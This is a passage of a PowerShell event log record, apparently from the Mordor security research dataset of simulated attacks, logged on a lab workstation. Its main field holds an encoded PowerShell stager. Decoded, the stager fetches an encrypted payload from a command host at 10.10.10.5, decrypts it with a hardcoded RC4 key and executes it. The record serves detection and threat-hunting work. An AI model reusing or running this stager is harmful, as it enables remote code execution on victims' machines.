gAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AYwBPAGQASQBOAEcAXQA6ADoAVQBuAEkAQwBPAEQARQAuAEcARQB0AFMAVAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgBUAF0AOgA6AEYAUgBPAE0AQgBhAFMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAEIAQQAwAC4ASABFAEEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAQgBhADAALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBNAC4ATgBlAHQALgBXAGUAYgBSAEUAUQB1AGUAcwBUAF0AOgA6AEQAZQBmAGEAdQBMAFQAVwBFAEIAUAByAG8AWAB5ADsAJABCAEEAMAAuAFAAcgBPAHgAWQAuAEMAcgBFAGQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBTAHQARQBNAC4ATgBlAFQALgBDAFIARQBkAGUATgB0AEkAQQBsAEMAYQBDAEgAZQBdADoAOgBEAGUARgBBAHUAbABUAE4ARQB0AFcATwBSAGsAQwBSAGUARABFAE4AdABJAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGIAYQAwAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAUwB0AEUATQAuAFQAZQBYAFQALgBFAE4AYwBPAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgBZAFQAZQBzACgAJwAhADgAQABiAFAARABpADwARgBuADIASwBjAC8ASAAsAFQAKwBaAH0AbwByAEMAawBhAF0AJgAxAHUAUQBTAF8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABiAEEAMAAuAEgAZQBBAGQAZQByAFMALgBBAEQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAWAByAGMAdABZAHQAdgBEAGMAagB2AGgAaAA9AFMANwBPAEsAUgA1AHYAOQBsAEwATgAxAGcANgBjAE0AYwBTAHMAbwBnAGQAdwAvAG4ANwBVAD0AIgApADsAJABEAEEAVABhAD0AJABiAEEAMAAuAEQAbwB3AG4ATABvAGEARABEAEEAdABBACgAJABTAEUAcgArACQAdAApADsAJABpAHYAPQAkAGQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAYQBUAGEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAQQBUAEEALgBMAGUATgBHAFQASABdADsALQBKAE8ASQBOAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = ece75448-87f6-4942-a1ab-51d43a53259f\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 1810\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n", "SourceName": "Microsoft-Windows-PowerShell", "Version": 1, "Category": "Executing Pipeline", "tags": ["mordorDataset"], "Hostname": "WORKSTATION5.theshire.local"}
